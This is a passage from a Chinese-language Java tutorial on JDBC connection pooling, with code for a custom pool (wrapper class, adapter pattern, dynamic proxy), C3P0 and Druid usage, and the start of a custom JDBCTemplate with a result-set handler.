 public PreparedStatement prepareStatement(String sql) throws SQLException {\r\n          return con.prepareStatement(sql);\r\n      }\r\n  \r\n      @Override\r\n      public CallableStatement prepareCall(String sql) throws SQLException {\r\n          return con.prepareCall(sql);\r\n      }\r\n  \r\n      @Override\r\n      public String nativeSQL(String sql) throws SQLException {\r\n          return con.nativeSQL(sql);\r\n      }\r\n  \r\n      @Override\r\n      public void setAutoCommit(boolean autoCommit) throws SQLException {\r\n          con.setAutoCommit(autoCommit);\r\n      }\r\n  \r\n      @Override\r\n      public boolean getAutoCommit() throws SQLException {\r\n          return con.getAutoCommit();\r\n      }\r\n  \r\n      @Override\r\n      public void commit() throws SQLException {\r\n          con.commit();\r\n      }\r\n  \r\n      @Override\r\n      public void rollback() throws SQLException {\r\n          con.rollback();\r\n      }\r\n  \r\n      @Override\r\n      public boolean isClosed() throws SQLException {\r\n          return con.isClosed();\r\n      }\r\n  \r\n      @Override\r\n      public DatabaseMetaData getMetaData() throws SQLException {\r\n          return con.getMetaData();\r\n      }\r\n  \r\n      @Override\r\n      public void setReadOnly(boolean readOnly) throws SQLException {\r\n          con.setReadOnly(readOnly);\r\n      }\r\n  \r\n      @Override\r\n      public boolean isReadOnly() throws SQLException {\r\n          return con.isReadOnly();\r\n      }\r\n  \r\n      @Override\r\n      public void setCatalog(String catalog) throws SQLException {\r\n          con.setCatalog(catalog);\r\n      }\r\n  \r\n      @Override\r\n      public String getCatalog() throws SQLException {\r\n          return con.getCatalog();\r\n      }\r\n  \r\n      @Override\r\n      public void setTransactionIsolation(int level) throws SQLException {\r\n          con.setTransactionIsolation(level);\r\n      }\r\n  \r\n      @Override\r\n      public int getTransactionIsolation() throws SQLException {\r\n          return con.getTransactionIsolation();\r\n      }\r\n  \r\n      @Override\r\n      public SQLWarning getWarnings() throws SQLException {\r\n          return con.getWarnings();\r\n      }\r\n  \r\n      @Override\r\n      public void clearWarnings() throws SQLException {\r\n          con.clearWarnings();\r\n      }\r\n  \r\n      @Override\r\n      public Statement createStatement(int resultSetType, int resultSetConcurrency) throws SQLException {\r\n          return con.createStatement(resultSetType,resultSetConcurrency);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, int resultSetType, int resultSetConcurrency) throws SQLException {\r\n          return con.prepareStatement(sql,resultSetType,resultSetConcurrency);\r\n      }\r\n  \r\n      @Override\r\n      public CallableStatement prepareCall(String sql, int resultSetType, int resultSetConcurrency) throws SQLException {\r\n          return con.prepareCall(sql,resultSetType,resultSetConcurrency);\r\n      }\r\n  \r\n      @Override\r\n      public Map<String, Class<?>> getTypeMap() throws SQLException {\r\n          return con.getTypeMap();\r\n      }\r\n  \r\n      @Override\r\n      public void setTypeMap(Map<String, Class<?>> map) throws SQLException {\r\n          con.setTypeMap(map);\r\n      }\r\n  \r\n      @Override\r\n      public void setHoldability(int holdability) throws SQLException {\r\n          con.setHoldability(holdability);\r\n      }\r\n  \r\n      @Override\r\n      public int getHoldability() throws SQLException {\r\n          return con.getHoldability();\r\n      }\r\n  \r\n      @Override\r\n      public Savepoint setSavepoint() throws SQLException {\r\n          return con.setSavepoint();\r\n      }\r\n  \r\n      @Override\r\n      public Savepoint setSavepoint(String name) throws SQLException {\r\n          return con.setSavepoint(name);\r\n      }\r\n  \r\n      @Override\r\n      public void rollback(Savepoint savepoint) throws SQLException {\r\n          con.rollback(savepoint);\r\n      }\r\n  \r\n      @Override\r\n      public void releaseSavepoint(Savepoint savepoint) throws SQLException {\r\n          con.releaseSavepoint(savepoint);\r\n      }\r\n  \r\n      @Override\r\n      public Statement createStatement(int resultSetType, int resultSetConcurrency, int resultSetHoldability) throws SQLException {\r\n          return con.createStatement(resultSetType,resultSetConcurrency,resultSetHoldability);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, int resultSetType, int resultSetConcurrency, int resultSetHoldability) throws SQLException {\r\n          return con.prepareStatement(sql,resultSetType,resultSetConcurrency,resultSetHoldability);\r\n      }\r\n  \r\n      @Override\r\n      public CallableStatement prepareCall(String sql, int resultSetType, int resultSetConcurrency, int resultSetHoldability) throws SQLException {\r\n          return con.prepareCall(sql,resultSetType,resultSetConcurrency,resultSetHoldability);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, int autoGeneratedKeys) throws SQLException {\r\n          return con.prepareStatement(sql,autoGeneratedKeys);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, int[] columnIndexes) throws SQLException {\r\n          return con.prepareStatement(sql,columnIndexes);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, String[] columnNames) throws SQLException {\r\n          return con.prepareStatement(sql,columnNames);\r\n      }\r\n  \r\n      @Override\r\n      public Clob createClob() throws SQLException {\r\n          return con.createClob();\r\n      }\r\n  \r\n      @Override\r\n      public Blob createBlob() throws SQLException {\r\n          return con.createBlob();\r\n      }\r\n  \r\n      @Override\r\n      public NClob createNClob() throws SQLException {\r\n          return con.createNClob();\r\n      }\r\n  \r\n      @Override\r\n      public SQLXML createSQLXML() throws SQLException {\r\n          return con.createSQLXML();\r\n      }\r\n  \r\n      @Override\r\n      public boolean isValid(int timeout) throws SQLException {\r\n          return con.isValid(timeout);\r\n      }\r\n  \r\n      @Override\r\n      public void setClientInfo(String name, String value) throws SQLClientInfoException {\r\n          con.setClientInfo(name,value);\r\n      }\r\n  \r\n      @Override\r\n      public void setClientInfo(Properties properties) throws SQLClientInfoException {\r\n          con.setClientInfo(properties);\r\n      }\r\n  \r\n      @Override\r\n      public String getClientInfo(String name) throws SQLException {\r\n          return con.getClientInfo(name);\r\n      }\r\n  \r\n      @Override\r\n      public Properties getClientInfo() throws SQLException {\r\n          return con.getClientInfo();\r\n      }\r\n  \r\n      @Override\r\n      public Array createArrayOf(String typeName, Object[] elements) throws SQLException {\r\n          return con.createArrayOf(typeName,elements);\r\n      }\r\n  \r\n      @Override\r\n      public Struct createStruct(String typeName, Object[] attributes) throws SQLException {\r\n          return con.createStruct(typeName,attributes);\r\n      }\r\n  \r\n      @Override\r\n      public void setSchema(String schema) throws SQLException {\r\n          con.setSchema(schema);\r\n      }\r\n  \r\n      @Override\r\n      public String getSchema() throws SQLException {\r\n          return con.getSchema();\r\n      }\r\n  \r\n      @Override\r\n      public void abort(Executor executor) throws SQLException {\r\n          con.abort(executor);\r\n      }\r\n  \r\n      @Override\r\n      public void setNetworkTimeout(Executor executor, int milliseconds) throws SQLException {\r\n          con.setNetworkTimeout(executor,milliseconds);\r\n      }\r\n  \r\n      @Override\r\n      public int getNetworkTimeout() throws SQLException {\r\n          return con.getNetworkTimeout();\r\n      }\r\n  \r\n      @Override\r\n      public <T> T unwrap(Class<T> iface) throws SQLException {\r\n          return con.unwrap(iface);\r\n      }\r\n  \r\n      @Override\r\n      public boolean isWrapperFor(Class<?> iface) throws SQLException {\r\n          return con.isWrapperFor(iface);\r\n      }\r\n  }\r\n  ```\r\n\r\n  - 自定义连接池类\r\n\r\n  ```java\r\n  public class MyDataSource implements DataSource{\r\n      //定义集合容器，用于保存多个数据库连接对象\r\n      private static List<Connection> pool = Collections.synchronizedList(new ArrayList<Connection>());\r\n  \r\n      //静态代码块，生成10个数据库连接保存到集合中\r\n      static {\r\n          for (int i = 0; i < 10; i++) {\r\n              Connection con = JDBCUtils.getConnection();\r\n              pool.add(con);\r\n          }\r\n      }\r\n  \r\n      //返回连接池的大小\r\n      public int getSize() {\r\n          return pool.size();\r\n      }\r\n  \r\n      //从池中返回一个数据库连接\r\n      @Override\r\n      public Connection getConnection() {\r\n          if(pool.size() > 0) {\r\n              //从池中获取数据库连接\r\n              Connection con = pool.remove(0);\r\n              //通过自定义连接对象进行包装\r\n              MyConnection2 mycon = new MyConnection2(con,pool);\r\n              //返回包装后的连接对象\r\n              return mycon;\r\n          }else {\r\n              throw new RuntimeException("连接数量已用尽");\r\n          }\r\n      }\r\n  }\r\n  ```\r\n\r\n- 适配器设计模式\r\n\r\n  - 通过之前MyConnection2连接类我们发现，有很多个需要实现的方法。这个时候我们就可以使用适配器设计模式了。提供一个适配器类，实现Connection接口，将所有功能进行实现(除了close方法)。自定义连接类只需要继承这个适配器类，重写需要改进的close()方法即可！\r\n  - 适配器类\r\n\r\n  ```java\r\n  /*\r\n      适配器抽象类。实现Connection接口。\r\n      实现所有的方法，调用mysql驱动包中Connection连接对象的方法\r\n   */\r\n  public abstract class MyAdapter implements Connection {\r\n  \r\n      // 定义数据库连接对象的变量\r\n      private Connection con;\r\n  \r\n      // 通过构造方法赋值\r\n      public MyAdapter(Connection con) {\r\n          this.con = con;\r\n      }\r\n  \r\n      // 所有的方法，均调用mysql的连接对象实现\r\n      @Override\r\n      public Statement createStatement() throws SQLException {\r\n          return con.createStatement();\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql) throws SQLException {\r\n          return con.prepareStatement(sql);\r\n      }\r\n  \r\n      @Override\r\n      public CallableStatement prepareCall(String sql) throws SQLException {\r\n          return con.prepareCall(sql);\r\n      }\r\n  \r\n      @Override\r\n      public String nativeSQL(String sql) throws SQLException {\r\n          return con.nativeSQL(sql);\r\n      }\r\n  \r\n      @Override\r\n      public void setAutoCommit(boolean autoCommit) throws SQLException {\r\n          con.setAutoCommit(autoCommit);\r\n      }\r\n  \r\n      @Override\r\n      public boolean getAutoCommit() throws SQLException {\r\n          return con.getAutoCommit();\r\n      }\r\n  \r\n      @Override\r\n      public void commit() throws SQLException {\r\n          con.commit();\r\n      }\r\n  \r\n      @Override\r\n      public void rollback() throws SQLException {\r\n          con.rollback();\r\n      }\r\n  \r\n      @Override\r\n      public boolean isClosed() throws SQLException {\r\n          return con.isClosed();\r\n      }\r\n  \r\n      @Override\r\n      public DatabaseMetaData getMetaData() throws SQLException {\r\n          return con.getMetaData();\r\n      }\r\n  \r\n      @Override\r\n      public void setReadOnly(boolean readOnly) throws SQLException {\r\n          con.setReadOnly(readOnly);\r\n      }\r\n  \r\n      @Override\r\n      public boolean isReadOnly() throws SQLException {\r\n          return con.isReadOnly();\r\n      }\r\n  \r\n      @Override\r\n      public void setCatalog(String catalog) throws SQLException {\r\n          con.setCatalog(catalog);\r\n      }\r\n  \r\n      @Override\r\n      public String getCatalog() throws SQLException {\r\n          return con.getCatalog();\r\n      }\r\n  \r\n      @Override\r\n      public void setTransactionIsolation(int level) throws SQLException {\r\n          con.setTransactionIsolation(level);\r\n      }\r\n  \r\n      @Override\r\n      public int getTransactionIsolation() throws SQLException {\r\n          return con.getTransactionIsolation();\r\n      }\r\n  \r\n      @Override\r\n      public SQLWarning getWarnings() throws SQLException {\r\n          return con.getWarnings();\r\n      }\r\n  \r\n      @Override\r\n      public void clearWarnings() throws SQLException {\r\n          con.clearWarnings();\r\n      }\r\n  \r\n      @Override\r\n      public Statement createStatement(int resultSetType, int resultSetConcurrency) throws SQLException {\r\n          return con.createStatement(resultSetType,resultSetConcurrency);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, int resultSetType, int resultSetConcurrency) throws SQLException {\r\n          return con.prepareStatement(sql,resultSetType,resultSetConcurrency);\r\n      }\r\n  \r\n      @Override\r\n      public CallableStatement prepareCall(String sql, int resultSetType, int resultSetConcurrency) throws SQLException {\r\n          return con.prepareCall(sql,resultSetType,resultSetConcurrency);\r\n      }\r\n  \r\n      @Override\r\n      public Map<String, Class<?>> getTypeMap() throws SQLException {\r\n          return con.getTypeMap();\r\n      }\r\n  \r\n      @Override\r\n      public void setTypeMap(Map<String, Class<?>> map) throws SQLException {\r\n          con.setTypeMap(map);\r\n      }\r\n  \r\n      @Override\r\n      public void setHoldability(int holdability) throws SQLException {\r\n          con.setHoldability(holdability);\r\n      }\r\n  \r\n      @Override\r\n      public int getHoldability() throws SQLException {\r\n          return con.getHoldability();\r\n      }\r\n  \r\n      @Override\r\n      public Savepoint setSavepoint() throws SQLException {\r\n          return con.setSavepoint();\r\n      }\r\n  \r\n      @Override\r\n      public Savepoint setSavepoint(String name) throws SQLException {\r\n          return con.setSavepoint(name);\r\n      }\r\n  \r\n      @Override\r\n      public void rollback(Savepoint savepoint) throws SQLException {\r\n          con.rollback(savepoint);\r\n      }\r\n  \r\n      @Override\r\n      public void releaseSavepoint(Savepoint savepoint) throws SQLException {\r\n          con.releaseSavepoint(savepoint);\r\n      }\r\n  \r\n      @Override\r\n      public Statement createStatement(int resultSetType, int resultSetConcurrency, int resultSetHoldability) throws SQLException {\r\n          return con.createStatement(resultSetType,resultSetConcurrency,resultSetHoldability);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, int resultSetType, int resultSetConcurrency, int resultSetHoldability) throws SQLException {\r\n          return con.prepareStatement(sql,resultSetType,resultSetConcurrency,resultSetHoldability);\r\n      }\r\n  \r\n      @Override\r\n      public CallableStatement prepareCall(String sql, int resultSetType, int resultSetConcurrency, int resultSetHoldability) throws SQLException {\r\n          return con.prepareCall(sql,resultSetType,resultSetConcurrency,resultSetHoldability);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, int autoGeneratedKeys) throws SQLException {\r\n          return con.prepareStatement(sql,autoGeneratedKeys);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, int[] columnIndexes) throws SQLException {\r\n          return con.prepareStatement(sql,columnIndexes);\r\n      }\r\n  \r\n      @Override\r\n      public PreparedStatement prepareStatement(String sql, String[] columnNames) throws SQLException {\r\n          return con.prepareStatement(sql,columnNames);\r\n      }\r\n  \r\n      @Override\r\n      public Clob createClob() throws SQLException {\r\n          return con.createClob();\r\n      }\r\n  \r\n      @Override\r\n      public Blob createBlob() throws SQLException {\r\n          return con.createBlob();\r\n      }\r\n  \r\n      @Override\r\n      public NClob createNClob() throws SQLException {\r\n          return con.createNClob();\r\n      }\r\n  \r\n      @Override\r\n      public SQLXML createSQLXML() throws SQLException {\r\n          return con.createSQLXML();\r\n      }\r\n  \r\n      @Override\r\n      public boolean isValid(int timeout) throws SQLException {\r\n          return con.isValid(timeout);\r\n      }\r\n  \r\n      @Override\r\n      public void setClientInfo(String name, String value) throws SQLClientInfoException {\r\n          con.setClientInfo(name,value);\r\n      }\r\n  \r\n      @Override\r\n      public void setClientInfo(Properties properties) throws SQLClientInfoException {\r\n          con.setClientInfo(properties);\r\n      }\r\n  \r\n      @Override\r\n      public String getClientInfo(String name) throws SQLException {\r\n          return con.getClientInfo(name);\r\n      }\r\n  \r\n      @Override\r\n      public Properties getClientInfo() throws SQLException {\r\n          return con.getClientInfo();\r\n      }\r\n  \r\n      @Override\r\n      public Array createArrayOf(String typeName, Object[] elements) throws SQLException {\r\n          return con.createArrayOf(typeName,elements);\r\n      }\r\n  \r\n      @Override\r\n      public Struct createStruct(String typeName, Object[] attributes) throws SQLException {\r\n          return con.createStruct(typeName,attributes);\r\n      }\r\n  \r\n      @Override\r\n      public void setSchema(String schema) throws SQLException {\r\n          con.setSchema(schema);\r\n      }\r\n  \r\n      @Override\r\n      public String getSchema() throws SQLException {\r\n          return con.getSchema();\r\n      }\r\n  \r\n      @Override\r\n      public void abort(Executor executor) throws SQLException {\r\n          con.abort(executor);\r\n      }\r\n  \r\n      @Override\r\n      public void setNetworkTimeout(Executor executor, int milliseconds) throws SQLException {\r\n          con.setNetworkTimeout(executor,milliseconds);\r\n      }\r\n  \r\n      @Override\r\n      public int getNetworkTimeout() throws SQLException {\r\n          return con.getNetworkTimeout();\r\n      }\r\n  \r\n      @Override\r\n      public <T> T unwrap(Class<T> iface) throws SQLException {\r\n          return con.unwrap(iface);\r\n      }\r\n  \r\n      @Override\r\n      public boolean isWrapperFor(Class<?> iface) throws SQLException {\r\n          return con.isWrapperFor(iface);\r\n      }\r\n  }\r\n  ```\r\n\r\n  - 自定义连接类\r\n\r\n  ```java\r\n  /*\r\n      自定义Connection连接类。通过适配器设计模式。完成close()方法的重写\r\n          1.定义一个类，继承适配器父类\r\n          2.定义Connection连接对象和连接池容器对象的变量\r\n          3.提供有参构造方法，接收连接对象和连接池对象，对变量赋值\r\n          4.在close()方法中，完成连接的归还\r\n   */\r\n  public class MyConnection3 extends MyAdapter {\r\n      //2.定义Connection连接对象和连接池容器对象的变量\r\n      private Connection con;\r\n      private List<Connection> pool;\r\n  \r\n      //3.提供有参构造方法，接收连接对象和连接池对象，对变量赋值\r\n      public MyConnection3(Connection con,List<Connection> pool) {\r\n          super(con);    // 将接收的数据库连接对象给适配器父类传递\r\n          this.con = con;\r\n          this.pool = pool;\r\n      }\r\n  \r\n      //4.在close()方法中，完成连接的归还\r\n      @Override\r\n      public void close() throws SQLException {\r\n          pool.add(con);\r\n      }\r\n  }\r\n  ```\r\n\r\n  - 自定义连接池类\r\n\r\n  ```java\r\n  public class MyDataSource implements DataSource{\r\n      //定义集合容器，用于保存多个数据库连接对象\r\n      private static List<Connection> pool = Collections.synchronizedList(new ArrayList<Connection>());\r\n  \r\n      //静态代码块，生成10个数据库连接保存到集合中\r\n      static {\r\n          for (int i = 0; i < 10; i++) {\r\n              Connection con = JDBCUtils.getConnection();\r\n              pool.add(con);\r\n          }\r\n      }\r\n  \r\n      //返回连接池的大小\r\n      public int getSize() {\r\n          return pool.size();\r\n      }\r\n  \r\n      //从池中返回一个数据库连接\r\n      @Override\r\n      public Connection getConnection() {\r\n          if(pool.size() > 0) {\r\n              //从池中获取数据库连接\r\n              Connection con = pool.remove(0);\r\n  \r\n              //通过自定义连接对象进行包装\r\n              //MyConnection2 mycon = new MyConnection2(con,pool);\r\n              MyConnection3 mycon = new MyConnection3(con,pool);\r\n  \r\n              //返回包装后的连接对象\r\n              return mycon;\r\n          }else {\r\n              throw new RuntimeException("连接数量已用尽");\r\n          }\r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n- 动态代理\r\n\r\n  - 经过我们适配器模式的改进，自定义连接类中的方法已经很简洁了。剩余所有的方法已经抽取到了适配器类中。但是适配器这个类还是我们自己编写的，也比较麻烦！所以可以使用动态代理的方式来改进。\r\n  - 自定义数据库连接池类\r\n\r\n  ```java\r\n  public class MyDataSource implements DataSource{\r\n      //定义集合容器，用于保存多个数据库连接对象\r\n      private static List<Connection> pool = Collections.synchronizedList(new ArrayList<Connection>());\r\n  \r\n      //静态代码块，生成10个数据库连接保存到集合中\r\n      static {\r\n          for (int i = 0; i < 10; i++) {\r\n              Connection con = JDBCUtils.getConnection();\r\n              pool.add(con);\r\n          }\r\n      }\r\n  \r\n      //返回连接池的大小\r\n      public int getSize() {\r\n          return pool.size();\r\n      }\r\n  \r\n      //动态代理方式\r\n      @Override\r\n      public Connection getConnection() {\r\n          if(pool.size() > 0) {\r\n              //从池中获取数据库连接\r\n              Connection con = pool.remove(0);\r\n  \r\n              Connection proxyCon = (Connection)Proxy.newProxyInstance(con.getClass().getClassLoader(), new Class[]{Connection.class}, new InvocationHandler() {\r\n                  /*\r\n                      执行Connection实现类所有方法都会经过invoke\r\n                      如果是close方法，则将连接还回池中\r\n                      如果不是，直接执行实现类的原有方法\r\n                   */\r\n                  @Override\r\n                  public Object invoke(Object proxy, Method method, Object[] args) throws Throwable {\r\n                      if(method.getName().equals("close")) {\r\n                          pool.add(con);\r\n                          return null;\r\n                      }else {\r\n                          return method.invoke(con,args);\r\n                      }\r\n                  }\r\n              });\r\n  \r\n              return proxyCon;\r\n          }else {\r\n              throw new RuntimeException("连接数量已用尽");\r\n          }\r\n      }\r\n  \r\n  \r\n      //从池中返回一个数据库连接\r\n      /*@Override\r\n      public Connection getConnection() {\r\n          if(pool.size() > 0) {\r\n              //从池中获取数据库连接\r\n              Connection con = pool.remove(0);\r\n  \r\n              //通过自定义连接对象进行包装\r\n              //MyConnection2 mycon = new MyConnection2(con,pool);\r\n              MyConnection3 mycon = new MyConnection3(con,pool);\r\n  \r\n              //返回包装后的连接对象\r\n              return mycon;\r\n          }else {\r\n              throw new RuntimeException("连接数量已用尽");\r\n          }\r\n      }*/\r\n  }\r\n  \r\n  ```\r\n\r\n#### 5.开源连接池的使用\r\n\r\n- C3P0\r\n\r\n  - 基本使用\r\n\r\n  ```java\r\n  /*\r\n      使用C3P0连接池\r\n      1.导入jar包\r\n      2.导入配置文件到src目录下\r\n      3.创建c3p0连接池对象\r\n      4.获取数据库连接进行使用\r\n   */\r\n  public class C3P0Demo1 {\r\n      public static void main(String[] args) throws Exception{\r\n          //创建c3p0连接池对象\r\n          DataSource dataSource = new ComboPooledDataSource();\r\n  \r\n          //获取数据库连接进行使用\r\n          Connection con = dataSource.getConnection();\r\n  \r\n          //查询全部学生信息\r\n          String sql = "SELECT * FROM student";\r\n          PreparedStatement pst = con.prepareStatement(sql);\r\n          ResultSet rs = pst.executeQuery();\r\n  \r\n          while(rs.next()) {\r\n              System.out.println(rs.getInt("sid") + "\\t" + rs.getString("name") + "\\t" + rs.getInt("age") + "\\t" + rs.getDate("birthday"));\r\n          }\r\n  \r\n          //释放资源\r\n          rs.close();\r\n          pst.close();\r\n          con.close();    // 将连接对象归还池中\r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n  - 配置演示\r\n\r\n  ```java\r\n  public class C3P0Demo2 {\r\n      public static void main(String[] args) throws Exception{\r\n          //创建c3p0连接池对象\r\n          DataSource dataSource = new ComboPooledDataSource();\r\n  \r\n          //获取数据库连接进行使用\r\n          for(int i = 1; i <= 11; i++) {\r\n              Connection con = dataSource.getConnection();\r\n              System.out.println(i + ":" + con);\r\n              if(i == 5) {\r\n                  con.close();\r\n              }\r\n          }\r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n- Druid\r\n\r\n  - 基本使用\r\n\r\n  ```java\r\n  /*\r\n      Druid连接池\r\n      1.导入jar包\r\n      2.编写配置文件，放在src目录下\r\n      3.通过Properties集合加载配置文件\r\n      4.通过Druid连接池工厂类获取数据库连接池对象\r\n      5.获取数据库连接，进行使用\r\n   */\r\n  public class DruidDemo1 {\r\n      public static void main(String[] args) throws Exception{\r\n          //通过Properties集合加载配置文件\r\n          InputStream is = DruidDemo1.class.getClassLoader().getResourceAsStream("druid.properties");\r\n          Properties prop = new Properties();\r\n          prop.load(is);\r\n  \r\n          //通过Druid连接池工厂类获取数据库连接池对象\r\n          DataSource dataSource = DruidDataSourceFactory.createDataSource(prop);\r\n  \r\n          //获取数据库连接，进行使用\r\n          Connection con = dataSource.getConnection();\r\n  \r\n          //查询全部学生信息\r\n          String sql = "SELECT * FROM student";\r\n          PreparedStatement pst = con.prepareStatement(sql);\r\n          ResultSet rs = pst.executeQuery();\r\n  \r\n          while(rs.next()) {\r\n              System.out.println(rs.getInt("sid") + "\\t" + rs.getString("name") + "\\t" + rs.getInt("age") + "\\t" + rs.getDate("birthday"));\r\n          }\r\n  \r\n          //释放资源\r\n          rs.close();\r\n          pst.close();\r\n          con.close();    // 将连接对象归还池中\r\n      }\r\n  }\r\n  \r\n  ```\r\n\r\n  - 抽取工具类\r\n\r\n  ```java\r\n  /*\r\n      数据库连接池工具类\r\n   */\r\n  public class DataSourceUtils {\r\n      //1.私有构造方法\r\n      private DataSourceUtils(){}\r\n  \r\n      //2.定义DataSource数据源变量\r\n      private static DataSource dataSource;\r\n  \r\n      //3.提供静态代码块，完成配置文件的加载和获取连接池对象\r\n      static {\r\n          try{\r\n              //加载配置文件\r\n              InputStream is = DruidDemo1.class.getClassLoader().getResourceAsStream("druid.properties");\r\n              Properties prop = new Properties();\r\n              prop.load(is);\r\n  \r\n              //获取数据库连接池对象\r\n              dataSource = DruidDataSourceFactory.createDataSource(prop);\r\n  \r\n          } catch(Exception e) {\r\n              e.printStackTrace();\r\n          }\r\n      }\r\n  \r\n      //4.提供获取数据库连接的方法\r\n      public static Connection getConnection() {\r\n          Connection con = null;\r\n          try {\r\n              con = dataSource.getConnection();\r\n          } catch (SQLException e) {\r\n              e.printStackTrace();\r\n          }\r\n          return con;\r\n      }\r\n  \r\n      //5.提供获取数据库连接池的方法\r\n      public static DataSource getDataSource() {\r\n          return dataSource;\r\n      }\r\n  \r\n      //6.提供释放资源的方法\r\n      public static void close(Connection con, Statement stat, ResultSet rs) {\r\n          if(con != null) {\r\n              try {\r\n                  con.close();\r\n              } catch (SQLException e) {\r\n                  e.printStackTrace();\r\n              }\r\n          }\r\n  \r\n          if(stat != null) {\r\n              try {\r\n                  stat.close();\r\n              } catch (SQLException e) {\r\n                  e.printStackTrace();\r\n              }\r\n          }\r\n  \r\n          if(rs != null) {\r\n              try {\r\n                  rs.close();\r\n              } catch (SQLException e) {\r\n                  e.printStackTrace();\r\n              }\r\n          }\r\n      }\r\n  \r\n      public static void close(Connection con, Statement stat) {\r\n          close(con,stat,null);\r\n      }\r\n  \r\n  }\r\n  \r\n  ```\r\n\r\n### 二、JDBC框架(JDBCTemplate)\r\n\r\n#### 1.分析前一天案例中的重复代码\r\n\r\n- dao层的重复代码\r\n  - 定义必要的信息、获取数据库的连接、释放资源都是重复的代码！\r\n  - 而我们最终的核心功能仅仅只是执行一条sql语句而已啊！\r\n  - 所以我们可以抽取出一个JDBC模板类，来封装一些方法(update、query)，专门帮我们执行增删改查的sql语句！\r\n  - 将之前那些重复的操作，都抽取到模板类中的方法里。就能大大简化我们的使用步骤！\r\n\r\n#### 2.自定义JDBC框架\r\n\r\n##### 2.1数据库的源信息\r\n\r\n- DataBaseMetaData(了解)：数据库的源信息\r\n  - java.sql.DataBaseMetaData：封装了整个数据库的综合信息\r\n  - 例如：\r\n    - String getDatabaseProductName()：获取数据库产品的名称\r\n    - int getDatabaseProductVersion()：获取数据库产品的版本号\r\n- ParameterMetaData：参数的源信息\r\n  - java.sql.ParameterMetaData：封装的是预编译执行者对象中每个参数的类型和属性\r\n  - 这个对象可以通过预编译执行者对象中的getParameterMetaData()方法来获取\r\n  - 核心功能：\r\n    - int getParameterCount()：获取sql语句中参数的个数\r\n- ResultSetMetaData：结果集的源信息\r\n  - java.sql.ResultSetMetaData：封装的是结果集对象中列的类型和属性\r\n  - 这个对象可以通过结果集对象中的getMetaData()方法来获取\r\n  - 核心功能：\r\n    - int getColumnCount()：获取列的总数\r\n    - String getColumnName(int i)：获取列名\r\n\r\n##### 2.2JDBCTemplate类增删改功能的编写\r\n\r\n```java\r\npublic class JDBCTemplate {\r\n    private DataSource dataSource;\r\n    private Connection con;\r\n    private PreparedStatement pst;\r\n    private ResultSet rs;\r\n\r\n    public JDBCTemplate(DataSource dataSource) {\r\n        this.dataSource = dataSource;\r\n    }\r\n\r\n    //专用于执行增删改sql语句的方法\r\n    public int update(String sql,Object...objs) {\r\n        int result = 0;\r\n\r\n        try{\r\n            con = dataSource.getConnection();\r\n            pst = con.prepareStatement(sql);\r\n\r\n            //获取sql语句中的参数源信息\r\n            ParameterMetaData pData = pst.getParameterMetaData();\r\n            //获取sql语句中参数的个数\r\n            int parameterCount = pData.getParameterCount();\r\n\r\n            //判断参数个数是否一致\r\n            if(parameterCount != objs.length) {\r\n                throw new RuntimeException("参数个数不匹配");\r\n            }\r\n\r\n            //为sql语句中的?占位符赋值\r\n            for (int i = 0; i < objs.length; i++) {\r\n                pst.setObject(i+1,objs[i]);\r\n            }\r\n\r\n            //执行sql语句\r\n            result = pst.executeUpdate();\r\n\r\n        } catch(Exception e) {\r\n            e.printStackTrace();\r\n        } finally {\r\n            //释放资源\r\n            DataSourceUtils.close(con,pst);\r\n        }\r\n\r\n        //返回结果\r\n        return result;\r\n    }\r\n}\r\n\r\n```\r\n\r\n##### 2.3JDBCTemplate类查询功能的编写\r\n\r\n- 实体类\r\n\r\n```java\r\n/*\r\n    学生实体类\r\n */\r\npublic class Student {\r\n    private Integer sid;\r\n    private String name;\r\n    private Integer age;\r\n    private Date birthday;\r\n\r\n    public Student() {\r\n    }\r\n\r\n    public Student(Integer sid, String name, Integer age, Date birthday) {\r\n        this.sid = sid;\r\n        this.name = name;\r\n        this.age = age;\r\n        this.birthday = birthday;\r\n    }\r\n\r\n    public Integer getSid() {\r\n        return sid;\r\n    }\r\n\r\n    public void setSid(Integer sid) {\r\n        this.sid = sid;\r\n    }\r\n\r\n    public String getName() {\r\n        return name;\r\n    }\r\n\r\n    public void setName(String name) {\r\n        this.name = name;\r\n    }\r\n\r\n    public Integer getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setAge(Integer age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public Date getBirthday() {\r\n        return birthday;\r\n    }\r\n\r\n    public void setBirthday(Date birthday) {\r\n        this.birthday = birthday;\r\n    }\r\n\r\n    @Override\r\n    public String toString() {\r\n        return "Student{" +\r\n                "sid=" + sid +\r\n                ", name=\'" + name + \'\\\'\' +\r\n                ", age=" + age +\r\n                ", birthday=" + birthday +\r\n                \'}\';\r\n    }\r\n}\r\n\r\n```\r\n\r\n- ResultSetHandler接口\r\n\r\n```java\r\n/*\r\n    用于处理结果集的接口\r\n */\r\npublic interface ResultSetHandler<T> {\r\n    //处理结果集的抽象方法。\r\n    <T> T handler(ResultSet rs);\r\n}\r\n\r\n```\r\n\r\n- BeanHandler实现类\r\n\r\n```java\r\n/*\r\n    实现类1：用于完成将查询出来的一条记录，封装到Student对象中\r\n */\r\npublic class BeanHandler<T> implements ResultSetHandler<T> {\r\n    //1.声明对象类型变量\r\n    private Class<T> beanClass;\r\n\r\n    //2.有参构造对变量赋值\r\n    public BeanHandler(Class<T> beanClass) {\r\n        this.beanClass = beanClass;\r\n    }\r\n\r\n    /*\r\n        将ResultSet结果集中的数据封装到beanClass类型对象中\r\n     */\r\n    @Override\r\n    public T handler(ResultSet rs) {\r\n        //3.声明对象\r\n        T bean = null;\r\n        try{\r\n            //4.创建传递参数的对象\r\n            bean = 